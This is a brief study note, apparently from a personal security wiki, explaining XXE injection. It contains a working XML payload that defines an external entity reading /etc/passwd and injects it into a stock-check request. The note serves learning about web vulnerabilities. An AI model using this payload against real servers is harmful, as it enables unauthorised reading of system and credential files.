---
tags:
  - web
  - security
---
A usage of [[XML External Entity|XXE]] to exfiltrate files.
# Example
```
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>381</productId></stockCheck>
```
Can be changed to include file data
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```
- Define an entity `&xxe;` whos value is the content of `/etc/passwd`